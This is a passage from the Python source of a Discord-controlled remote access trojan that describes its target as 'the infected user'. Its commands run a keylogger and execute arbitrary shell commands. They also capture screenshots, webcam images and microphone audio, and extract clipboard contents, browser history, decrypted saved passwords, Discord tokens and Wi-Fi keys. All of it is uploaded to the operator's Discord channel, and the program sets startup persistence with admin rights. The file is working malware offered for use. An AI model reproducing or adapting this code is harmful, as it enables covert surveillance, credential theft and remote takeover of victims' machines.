    keylogger_thread = threading.Thread(target=start_keylogger_listener, daemon=True)
    keylogger_thread.start()
    await interaction.response.send_message(embed=discord.Embed(title="Keylogger Started", description="Keystrokes are now being recorded.", color=CYAN_THEME))

@keylogger_group.command(name="stop", description="Stops the keylogger.")
@is_allowed_channel()
async def keylogger_stop(interaction: discord.Interaction):
    global keylogger_thread
    if not keylogger_thread or not keylogger_thread.is_alive():
        await interaction.response.send_message(embed=discord.Embed(title="Keylogger", description="Keylogger is not running.", color=CYAN_THEME))
        return
    
    stop_keylogger.set()
    keylogger_thread.join(timeout=2)
    keylogger_thread = None
    await interaction.response.send_message(embed=discord.Embed(title="Keylogger Stopped", description="Keystroke recording has been stopped.", color=CYAN_THEME))

@keylogger_group.command(name="logs", description="Sends the keylogger logs.")
@is_allowed_channel()
async def keylogger_logs(interaction: discord.Interaction):
    if os.path.exists(keylogger_log):
        await interaction.response.send_message(file=discord.File(keylogger_log))
    else:
        await interaction.response.send_message(embed=discord.Embed(title="Keylogger", description="Log file not found.", color=CYAN_THEME))

@keylogger_group.command(name="clear", description="Clears the keylogger logs.")
@is_allowed_channel()
async def keylogger_clear(interaction: discord.Interaction):
    if os.path.exists(keylogger_log):
        os.remove(keylogger_log)
        await interaction.response.send_message(embed=discord.Embed(title="Keylogger", description="Log file cleared.", color=CYAN_THEME))
    else:
        await interaction.response.send_message(embed=discord.Embed(title="Keylogger", description="Log file not found.", color=CYAN_THEME))
bot.tree.add_command(keylogger_group)

process_group = app_commands.Group(name="process", description="Process management commands")

@process_group.command(name="list", description="Lists running processes.")
@is_allowed_channel()
async def process_list(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)
    try:
        processes =[]
        for p in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
            try:
                processes.append(p.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        output = "PID   | Process Name        | CPU % | Memory (MB)\n"
        output += "------|---------------------|-------|------------\n"
        for p in sorted(processes, key=lambda i: i['memory_info'].rss, reverse=True)[:50]:
            mem_mb = p['memory_info'].rss / (1024 * 1024)
            output += f"{p['pid']:<5} | {p['name']:<20.20s}| {p['cpu_percent']:<5.1f} | {mem_mb:<10.2f}\n"

        if len(output) > 2000:
            with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding='utf-8') as tmp:
                tmp.write(output)
            await interaction.followup.send("Process list is too long:", file=discord.File(tmp.name, filename="process_list.txt"))
            os.unlink(tmp.name)
        else:
            embed = discord.Embed(title="Running Processes", description=f"```{output}```", color=CYAN_THEME)
            await interaction.followup.send(embed=embed)
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Process Error", description=str(e), color=CYAN_THEME))

@process_group.command(name="kill", description="Kills a process by name or PID.")
@is_allowed_channel()
@app_commands.choices(by=[
    app_commands.Choice(name="Name", value="name"),
    app_commands.Choice(name="PID", value="pid"),
])
async def process_kill(interaction: discord.Interaction, identifier: str, by: app_commands.Choice[str]):
    await interaction.response.defer(ephemeral=False)
    killed =[]
    try:
        if by.value == "pid":
            pid = int(identifier)
            p = psutil.Process(pid)
            p.kill()
            killed.append(f"{p.name()} (PID: {pid})")
        elif by.value == "name":
            for p in psutil.process_iter(['pid', 'name']):
                if p.info['name'].lower() == identifier.lower():
                    proc_to_kill = psutil.Process(p.info['pid'])
                    proc_to_kill.kill()
                    killed.append(f"{p.info['name']} (PID: {p.info['pid']})")
        
        if killed:
            await interaction.followup.send(embed=discord.Embed(title="Process Killed", description=f"Successfully terminated:\n`{', '.join(killed)}`", color=CYAN_THEME))
        else:
            await interaction.followup.send(embed=discord.Embed(title="Process Not Found", description=f"No process found with the {by.name} `{identifier}`.", color=CYAN_THEME))
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Kill Error", description=str(e), color=CYAN_THEME))
bot.tree.add_command(process_group)

@bot.tree.command(name="power", description="Control the system's power state.")
@is_allowed_channel()
@app_commands.choices(action=[
    app_commands.Choice(name="Shutdown", value="shutdown"),
    app_commands.Choice(name="Restart", value="restart"),
    app_commands.Choice(name="Logoff", value="logoff"),
    app_commands.Choice(name="Lock", value="lock"),
])
async def power(interaction: discord.Interaction, action: app_commands.Choice[str]):
    commands = {
        "shutdown": ("shutdown /s /t 1", "Shutting down..."),
        "restart": ("shutdown /r /t 1", "Restarting..."),
        "logoff": ("shutdown /l", "Logging off..."),
        "lock": ("rundll32.exe user32.dll,LockWorkStation", "Locking station..."),
    }
    command, message = commands[action.value]
    await interaction.response.defer(ephemeral=False)
    try:
        await interaction.followup.send(embed=discord.Embed(title="Power Control", description=message, color=CYAN_THEME))
        os.system(command)
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Power Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="sysinfo", description="Get detailed system information.")
@is_allowed_channel()
async def sysinfo(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)
    try:
        uname = platform.uname()
        ram = psutil.virtual_memory()
        swap = psutil.swap_memory()

        if os.name == "nt":
            disk_path = os.environ.get("SystemDrive", "C:") + "\\"
        else:
            disk_path = "/"
        disk = psutil.disk_usage(disk_path)

        boot = psutil.boot_time()
        uptime_s = time.time() - boot
        days, rem = divmod(int(uptime_s), 86400)
        hrs, rem = divmod(rem, 3600)
        mins, secs = divmod(rem, 60)
        uptime_str = f"{days}d {hrs}h {mins}m {secs}s"

        try:
            user_login = os.getlogin()
        except OSError:
            user_login = getpass.getuser()

        proc = (uname.processor or "").strip() or platform.processor() or "unknown"
        phys = psutil.cpu_count(logical=False)
        logi = psutil.cpu_count(logical=True)

        try:
            loop = asyncio.get_running_loop()
            public_ip = await asyncio.wait_for(loop.run_in_executor(None, get_public_ip), timeout=8.0)
        except Exception:
            public_ip = "unavailable"

        ver = (uname.version or "").replace("`", "’")[:400]

        embed = discord.Embed(title="System Information", color=CYAN_THEME)
        embed.add_field(name="OS", value=f"`{uname.system} {uname.release}`", inline=False)
        if ver:
            embed.add_field(name="Version / build", value=f"`{ver}`", inline=False)
        embed.add_field(name="Hostname", value=f"`{uname.node}`", inline=True)
        embed.add_field(name="Username", value=f"`{user_login}`", inline=True)
        embed.add_field(name="Machine", value=f"`{uname.machine}`", inline=True)
        embed.add_field(name="Processor", value=f"`{proc}`", inline=False)
        embed.add_field(name="Python", value=f"`{sys.version.split()[0]}`", inline=True)
        embed.add_field(name="CPUs", value=f"`physical {phys} · logical {logi}`", inline=True)
        embed.add_field(
            name="RAM",
            value=f"`{ram.used / (1024 ** 3):.2f} / {ram.total / (1024 ** 3):.2f} GB ({ram.percent}% used)`",
            inline=False,
        )
        embed.add_field(
            name="Swap",
            value=f"`{swap.used / (1024 ** 3):.2f} / {swap.total / (1024 ** 3):.2f} GB ({swap.percent}% used)`",
            inline=True,
        )
        embed.add_field(
            name=f"Disk ({disk_path})",
            value=f"`{disk.used / (1024 ** 3):.2f} / {disk.total / (1024 ** 3):.2f} GB ({disk.percent}% used, {disk.free / (1024 ** 3):.2f} GB free)`",
            inline=False,
        )
        embed.add_field(name="Uptime", value=f"`{uptime_str}`", inline=True)
        embed.add_field(
            name="Boot (UTC)",
            value=f"`{time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(boot))}`",
            inline=True,
        )
        embed.add_field(name="Public IP", value=f"`{public_ip}`", inline=True)

        await interaction.followup.send(embed=embed)
    except Exception as e:
        await interaction.followup.send(
            embed=discord.Embed(title="Sysinfo Error", description=str(e), color=CYAN_THEME),
        )

@bot.tree.command(name="shell", description="Execute a shell command.")
@is_allowed_channel()
async def shell(interaction: discord.Interaction, command: str, timeout: int = 60):
    await interaction.response.defer(ephemeral=False)
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout, errors='ignore')
        output = (result.stdout or result.stderr).strip() or "No output."
        if len(output) > MAX_EMBED_LEN:
            with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tmp:
                tmp.write(output)
            await interaction.followup.send("Shell output is too large:", file=discord.File(tmp.name, filename="shell_output.txt"))
            os.unlink(tmp.name)
        else:
            embed = discord.Embed(title=f"Shell Output for `{command}`", description=f"```{output}```", color=CYAN_THEME)
            await interaction.followup.send(embed=embed)
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Shell Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="ss", description="Take a screenshot of the screen.")
@is_allowed_channel()
async def ss(interaction: discord.Interaction, format: str = "png"):
    await interaction.response.defer(ephemeral=False)
    try:
        file_suffix = ".jpg" if format.lower() == "jpg" else ".png"
        with tempfile.NamedTemporaryFile(suffix=file_suffix, delete=False) as tmpfile:
            screenshot_path = tmpfile.name
        pyautogui.screenshot(screenshot_path)
        await interaction.followup.send(file=discord.File(screenshot_path))
        os.unlink(screenshot_path)
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Screenshot Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="url", description="Open a URL in the target's default browser.")
@is_allowed_channel()
async def url(interaction: discord.Interaction, url: str):
    await interaction.response.defer(ephemeral=False)
    try:
        webbrowser.open(url)
        await interaction.followup.send(embed=discord.Embed(title="URL Opened", description=f"Successfully opened `{url}`.", color=CYAN_THEME))
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="URL Error", description=str(e), color=CYAN_THEME))

@app_commands.choices(message_type=[
    app_commands.Choice(name="Information", value="info"),
    app_commands.Choice(name="Warning", value="warning"),
    app_commands.Choice(name="Error", value="error"),
])
@bot.tree.command(name="message", description="Display a message box on the target's screen.")
@is_allowed_channel()
async def message(interaction: discord.Interaction, message_type: app_commands.Choice[str], text: str):
    await interaction.response.defer(ephemeral=False)
    try:
        icons = {"warning": 0x30, "info": 0x40, "error": 0x10}
        ctypes.windll.user32.MessageBoxW(0, text, message_type.name, icons.get(message_type.value, 0x40))
        await interaction.followup.send(embed=discord.Embed(title="Message Sent", description=f"Displayed message box.", color=CYAN_THEME))
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Message Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="voice", description="Use text-to-speech on the target machine.")
@is_allowed_channel()
async def voice(interaction: discord.Interaction, text: str):
    await interaction.response.defer(ephemeral=False)
    try:
        threading.Thread(target=speak, args=(text,), daemon=True).start()
        await interaction.followup.send(embed=discord.Embed(title="Voice Command Sent", description=f"Speaking: `{text}`", color=CYAN_THEME))
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Voice Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="clipboard", description="Retrieve content from the clipboard.")
@is_allowed_channel()
async def clipboard(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False)
    try:
        content = get_clipboard_content()
        if len(content) > MAX_EMBED_LEN:
            with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding='utf-8') as tmp:
                tmp.write(content)
            await interaction.followup.send("Clipboard content is too large:", file=discord.File(tmp.name, filename="clipboard.txt"))
            os.unlink(tmp.name)
        else:
            await interaction.followup.send(embed=discord.Embed(title="Clipboard Content", description=f"```{content}```", color=CYAN_THEME))
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Clipboard Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="webcampic", description="Capture an image from a webcam.")
@is_allowed_channel()
async def webcampic(interaction: discord.Interaction, cam_id: int = 0):
    await interaction.response.defer(ephemeral=False)
    try:
        cap = cv2.VideoCapture(cam_id)
        if not cap.isOpened():
            await interaction.followup.send(embed=discord.Embed(title="Webcam Error", description=f"Failed to open camera ID `{cam_id}`.", color=CYAN_THEME))
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
                cv2.imwrite(tmp.name, frame)
                await interaction.followup.send(file=discord.File(tmp.name))
            os.unlink(tmp.name)
        else:
            await interaction.followup.send(embed=discord.Embed(title="Webcam Error", description=f"Failed to capture image from camera ID `{cam_id}`.", color=CYAN_THEME))
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Webcam Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="history", description="Extracts browser history and uploads it as a text file.")
@is_allowed_channel()
async def history(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)
    temp_files_to_clean =[]
    try:
        await interaction.edit_original_response(embed=discord.Embed(title="Extracting History", description="Closing browser processes to access history databases...", color=CYAN_THEME))
        kill_browser_processes()
        await asyncio.sleep(2)

        all_history =[]
        browser_locations = get_browser_paths()

        for browser in browser_locations:
            if browser['type'] == 'chromium':
                for root, _, files in os.walk(browser['path']):
                    for file in files:
                        if file == 'History':
                            history_db_path = os.path.join(root, file)
                            profile_name = os.path.basename(os.path.dirname(history_db_path))
                            all_history.extend(extract_chromium_history(history_db_path, browser['name'], profile_name))
            elif browser['type'] == 'firefox':
                 for root, _, files in os.walk(browser['path']):
                    for file in files:
                        if file == 'places.sqlite':
                            history_db_path = os.path.join(root, file)
                            all_history.extend(extract_firefox_history(os.path.dirname(history_db_path), browser['name']))
            
        if not all_history:
            await interaction.edit_original_response(embed=discord.Embed(title="Browser History", description="No browser history could be found.", color=CYAN_THEME))
            return

        all_history.sort(key=lambda x: x['visit_time'], reverse=True)
        history_by_browser = {entry['browser']:[] for entry in all_history}
        for entry in all_history:
            history_by_browser[entry['browser']].append(entry)

        file_content = f"Browser History Report for {os.getlogin()}\nGenerated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        for browser, entries in history_by_browser.items():
            file_content += f"========================\n  {browser}\n========================\n\n"
            for entry in entries:
                file_content += f"[{entry['visit_time']}] - {entry['title']}\nURL: {entry['url']}\n------------------------\n"
            file_content += "\n"

        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt', encoding='utf-8') as tmp_file:
            tmp_file.write(file_content)
            tmp_file_path = tmp_file.name
            temp_files_to_clean.append(tmp_file_path)

        if os.path.getsize(tmp_file_path) > DISCORD_FILE_LIMIT_BYTES:
            await interaction.edit_original_response(content=None, embed=discord.Embed(title="History Too Large", description=f"History is larger than {DISCORD_FILE_LIMIT_BYTES // 1024 // 1024}MB, splitting into multiple files...", color=CYAN_THEME))
            
            part_num = 1
            with open(tmp_file_path, 'rb') as f:
                while True:
                    chunk = f.read(DISCORD_FILE_LIMIT_BYTES - 1024*1024) 
                    if not chunk:
                        break
                    
                    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix=f'_part{part_num}.txt') as chunk_file:
                        chunk_file.write(chunk)
                        chunk_file_path = chunk_file.name
                        temp_files_to_clean.append(chunk_file_path)
                    
                    await interaction.followup.send(file=discord.File(chunk_file_path, filename=f"browser_history_part_{part_num}.txt"))
                    part_num += 1
        else:
            embed = discord.Embed(title="Browser History Extracted", description="Successfully extracted browser history.", color=CYAN_THEME)
            await interaction.edit_original_response(content=None, embed=embed, attachments=[discord.File(tmp_file_path, filename="browser_history.txt")])

    except Exception as e:
        await interaction.edit_original_response(embed=discord.Embed(title="History Extraction Error", description=str(e), color=discord.Color.red()), attachments=[])
    finally:
        for f in temp_files_to_clean:
            try:
                if os.path.exists(f):
                    os.remove(f)
            except Exception:
                pass

@bot.tree.command(name="passwords", description="Extracts saved passwords from browsers.")
@is_allowed_channel()
async def passwords(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)
    if not CRYPTO_ENABLED:
        await interaction.followup.send(embed=discord.Embed(title="Dependency Missing", description="`pycryptodome` or `pywin32` is not installed.", color=CYAN_THEME))
        return

    try:
        await interaction.edit_original_response(embed=discord.Embed(title="Extracting Passwords", description="Closing browser processes...", color=CYAN_THEME))
        kill_browser_processes()
        await asyncio.sleep(2)

        grabber = PasswordGrabber()
        results = await asyncio.to_thread(grabber.grab_all)
        
        valid_results =[]
        for item in results:
            pw = item['password']
            if not pw or pw == "[v20 App-Bound Encrypted]" or not item['username']:
                continue
            valid_results.append(item)

        if not valid_results:
            await interaction.edit_original_response(embed=discord.Embed(
                title="No Accessible Passwords Found", 
                description="No valid passwords were found.\n*Note: Passwords encrypted by Chrome v127+ App-Bound Encryption were filtered out.*", 
                color=CYAN_THEME))
            return

        temp_csv = os.path.join(tempfile.gettempdir(), "passwords_decrypted.csv")
        with open(temp_csv, 'w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(["Browser", "URL", "Username", "Password"])
            for item in valid_results:
                writer.writerow([item['browser'], item['url'], item['username'], item['password']])

        await interaction.edit_original_response(embed=discord.Embed(
            title="Passwords Extracted", 
            description=f"Successfully extracted {len(valid_results)} passwords.\n*Note: Chrome v127+ App-Bound Encrypted passwords were skipped.*", 
            color=CYAN_THEME), 
            attachments=[discord.File(temp_csv, filename="passwords_decrypted.csv")])
        os.unlink(temp_csv)

    except Exception as e:
        await interaction.edit_original_response(embed=discord.Embed(title="Password Extraction Error", description=str(e), color=CYAN_THEME), attachments=[])

@bot.tree.command(name="tokens", description="Extracts Discord tokens.")
@is_allowed_channel()
async def tokens(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)
    if not CRYPTO_ENABLED:
        await interaction.followup.send(embed=discord.Embed(title="Dependency Missing", description="`pycryptodome` or `pywin32` is not installed.", color=CYAN_THEME))
        return

    try:
        await interaction.edit_original_response(embed=discord.Embed(title="Extracting Tokens", description="Scanning for Discord tokens...", color=CYAN_THEME))
        
        grabber = TokenGrabber()
        await asyncio.to_thread(grabber.grab_tokens)
        embeds = await asyncio.to_thread(grabber.get_token_embeds)
        
        if not embeds:
            await interaction.edit_original_response(embed=discord.Embed(title="Tokens", description="No valid Discord tokens found.", color=CYAN_THEME))
            return
            
        await interaction.edit_original_response(embed=discord.Embed(title="Tokens Extracted", description=f"Found {len(embeds)} valid token(s). Sending details...", color=CYAN_THEME))
        for embed in embeds:
            await interaction.followup.send(embed=embed)

    except Exception as e:
        await interaction.edit_original_response(embed=discord.Embed(title="Token Extraction Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="wifi", description="Extracts saved Wi-Fi networks and passwords.")
@is_allowed_channel()
async def wifi(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)
    if platform.system() != "Windows":
        await interaction.followup.send(embed=discord.Embed(title="Unsupported OS", description="This command only works on Windows.", color=CYAN_THEME))
        return

    try:
        profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in profiles_data if "All User Profile" in i]
        
        wifi_list =[]
        for profile in profiles:
            try:
                profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                password =[i.split(":")[1][1:-1] for i in profile_info if "Key Content" in i]
                wifi_list.append(f"SSID: {profile}\nPassword: {password[0] if password else 'None'}\n--------------------")
            except Exception:
                continue
        
        output = "\n".join(wifi_list)
        if not output:
            output = "No saved Wi-Fi profiles found."

        if len(output) > 4000:
            with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding='utf-8') as tmp:
                tmp.write(output)
            await interaction.followup.send(file=discord.File(tmp.name, filename="wifi_passwords.txt"))
            os.unlink(tmp.name)
        else:
            embed = discord.Embed(title="Saved Wi-Fi Networks", description=f"```{output}```", color=CYAN_THEME)
            await interaction.followup.send(embed=embed)
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Wi-Fi Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="wallpaper", description="Change the target's desktop wallpaper.")
@is_allowed_channel()
async def wallpaper(interaction: discord.Interaction, url: str = None, attachment: discord.Attachment = None):
    await interaction.response.defer(ephemeral=False)
    if not url and not attachment:
        await interaction.followup.send(embed=discord.Embed(title="Input Error", description="Please provide either a `url` or an `attachment`.", color=CYAN_THEME))
        return
    
    image_path = os.path.join(tempfile.gettempdir(), "wallpaper.jpg")
    try:
        if url:
            response = requests.get(url, stream=True)
            response.raise_for_status()
            with open(image_path, 'wb') as f:
                shutil.copyfileobj(response.raw, f)
        else:
            await attachment.save(image_path)
        
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        await interaction.followup.send(embed=discord.Embed(title="Wallpaper Changed", description="Desktop wallpaper has been updated.", color=CYAN_THEME), file=discord.File(image_path))
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Wallpaper Error", description=str(e), color=CYAN_THEME))
    finally:
        if os.path.exists(image_path):
            os.remove(image_path)

def record_audio(duration, fs):
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait() 
    return recording

@bot.tree.command(name="mic", description="Record audio from the microphone.")
@is_allowed_channel()
async def mic(interaction: discord.Interaction, duration: app_commands.Range[int, 1, 300]):
    await interaction.response.defer(ephemeral=False, thinking=True)
    if not MIC_ENABLED:
        await interaction.followup.send(embed=discord.Embed(title="Dependency Missing", description="`sounddevice` or `scipy` is not installed on the target machine.", color=CYAN_THEME))
        return
        
    temp_path = os.path.join(tempfile.gettempdir(), f"recording_{int(time.time())}.wav")
    try:
        await interaction.edit_original_response(content=f"Recording for {duration} seconds...")
        fs = 44100
        
        recording = await asyncio.to_thread(record_audio, duration, fs)
        await asyncio.to_thread(write_wav, temp_path, fs, recording)

        await interaction.edit_original_response(content="Uploading recording...", attachments=[discord.File(temp_path)])
    except Exception as e:
        await interaction.edit_original_response(content=None, embed=discord.Embed(title="Mic Error", description=str(e), color=CYAN_THEME))
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)

@bot.tree.command(name="idle", description="Check the user's idle time.")
@is_allowed_channel()
async def idle(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False)
    if platform.system() != "Windows":
        await interaction.followup.send(embed=discord.Embed(title="Unsupported OS", description="This command only works on Windows.", color=CYAN_THEME))
        return

    class LASTINPUTINFO(ctypes.Structure):
        _fields_ =[('cbSize', ctypes.c_uint), ('dwTime', ctypes.c_uint)]

    try:
        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
        
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        idle_time = timedelta(milliseconds=millis)

        await interaction.followup.send(embed=discord.Embed(title="User Idle Time", description=f"The user has been idle for: `{str(idle_time).split('.')[0]}`", color=CYAN_THEME))
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Idle Check Error", description=str(e), color=CYAN_THEME))

@bot.tree.command(name="clear", description="Clear messages in the current channel.")
@is_allowed_channel()
async def clear(interaction: discord.Interaction, limit: int = None):
    await interaction.response.defer(ephemeral=True)
    try:
        purged = await interaction.channel.purge(limit=limit)
        await interaction.followup.send(f"Successfully cleared {len(purged)} messages.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(embed=discord.Embed(title="Clear Error", description=f"Could not clear messages: {e}", color=CYAN_THEME), ephemeral=True)

@bot.tree.command(name="exit", description="Shutdown the bot session.")
@is_allowed_channel()
async def exit_command(interaction: discord.Interaction):
    await interaction.response.send_message(embed=discord.Embed(title="Shutting Down", description="The bot session is shutting down.", color=CYAN_THEME))
    await bot.close()
    
@bot.tree.command(
    name="location",
    description="Approximate geolocation for the infected user's ip.",
)
@is_allowed_channel()
async def location(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)

    def _fetch():
        public_ip = get_public_ip()
        if public_ip in (None, "", "Unknown IP"):
            return None, "no_ip", None

        try:
            addr = ipaddress.ip_address(public_ip)
        except ValueError:
            return None, "bad_ip", public_ip

        if not addr.is_global:
            return None, "private_ip", public_ip

        r = requests.get(
            f"http://ip-api.com/json/{public_ip}",
            params={"fields": "status,message,query,country,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,reverse"},
            timeout=10,
            headers={"User-Agent": "DiscordBot/1.0"},
        )
        r.raise_for_status()
        return public_ip, "ok", r.json()

    try:
        public_ip, kind, payload = await asyncio.to_thread(_fetch)

        if kind == "no_ip":
            await interaction.followup.send(
                embed=discord.Embed(
                    title="Location Error",
                    description="Could not determine the public IP address.",
                    color=CYAN_THEME,
                ),
            )
            return

        if kind == "bad_ip":
            await interaction.followup.send(
                embed=discord.Embed(
                    title="Location Error",
                    description=f"Public IP value is not valid: `{payload}`",
                    color=CYAN_THEME,
                ),
            )
            return

        if kind == "private_ip":
            await interaction.followup.send(
                embed=discord.Embed(
                    title="Location Error",
                    description=f"This host’s address is not a public routable IP: `{payload}` (geolocation needs the WAN IP).",
                    color=CYAN_THEME,
                ),
            )
            return

        data = payload
        if data.get("status") == "fail":
            await interaction.followup.send(
                embed=discord.Embed(
                    title="Location Error",
                    description=f"Failed to geolocate IP: `{data.get('message', 'Unknown reason')}`",
                    color=CYAN_THEME,
                ),
            )
            return

        looked_up = data.get("query") or public_ip
        lat, lon = data.get("lat"), data.get("lon")

        embed = discord.Embed(
            title="Geolocation (IP-based)",
            description=f"Registered location for IP: `{looked_up}`",
            color=CYAN_THEME,
        )

        if lat is not None and lon is not None:
            maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
            embed.add_field(name="📍 Map", value=f"[`Open in Google Maps`]({maps_link})", inline=False)
            embed.add_field(name="Coordinates", value=f"`{lat}, {lon}`", inline=True)
        else:
            embed.add_field(name="Coordinates", value="`N/A`", inline=True)

        embed.add_field(name="Country", value=f"`{data.get('country', 'N/A')}`", inline=True)
        embed.add_field(name="Region", value=f"`{data.get('regionName', 'N/A')}`", inline=True)
        embed.add_field(name="City", value=f"`{data.get('city', 'N/A')}`", inline=True)
        embed.add_field(name="ZIP", value=f"`{data.get('zip', 'N/A')}`", inline=True)
        embed.add_field(name="Timezone", value=f"`{data.get('timezone', 'N/A')}`", inline=True)

        flags =[]
        if data.get("mobile"):
            flags.append("mobile")
        if data.get("proxy"):
            flags.append("proxy/VPN")
        if data.get("hosting"):
            flags.append("hosting/datacenter")
        if flags:
            embed.add_field(name="Flags", value=f"`{', '.join(flags)}`", inline=False)

        embed.add_field(name="ISP", value=f"`{data.get('isp', 'N/A')}`", inline=False)
        embed.add_field(name="Organization", value=f"`{data.get('org', 'N/A')}`", inline=False)
        if data.get("as") or data.get("asname"):
            embed.add_field(name="AS", value=f"`{data.get('as', 'N/A')} {data.get('asname', '')}`".strip(), inline=False)
        if data.get("reverse"):
            embed.add_field(name="Reverse DNS", value=f"`{data['reverse']}`", inline=False)

        embed.set_footer(
            text="IP geolocation is approximate (often city/ISP area), not GPS. With VPNs or mobile networks it may be far from the physical device.",
        )

        await interaction.followup.send(embed=embed)

    except requests.RequestException as e:
        await interaction.followup.send(
            embed=discord.Embed(
                title="API Error",
                description=f"Could not reach the geolocation service: `{e}`",
                color=CYAN_THEME,
            ),
        )
    except Exception as e:
        await interaction.followup.send(
            embed=discord.Embed(
                title="Location Error",
                description=f"An unexpected error occurred: `{e}`",
                color=CYAN_THEME,
            ),
        )

if __name__ == "__main__":
    if rarfile is None:
        print("Warning: 'rarfile' library not found.")
    if not MIC_ENABLED:
        print("Warning: 'sounddevice' or 'scipy' not found. /mic command will be disabled.")
    if not CRYPTO_ENABLED:
        print("Warning: 'pycryptodome' or 'pywin32' not found. /passwords and /tokens commands will be disabled.")

    if not is_admin():
        ctypes.windll.user32.MessageBoxW(0, "This program requires administrator privileges to function correctly.", "Admin Required", 0x10)
        sys.exit()

    ensure_startup_persistence()

    while True:
        try:
            requests.get("https://www.google.com", timeout=5)
            bot.run(TOKEN)
        except discord.errors.LoginFailure:
            print("FATAL: Invalid Discord token.")
            break
        except requests.exceptions.ConnectionError:
            print("No internet connection. Retrying in 15 seconds...")
            time.sleep(15)
        except Exception as e:
            print(f"An unexpected error occurred: {e}. Restarting in 15 seconds...")
            time.sleep(15)
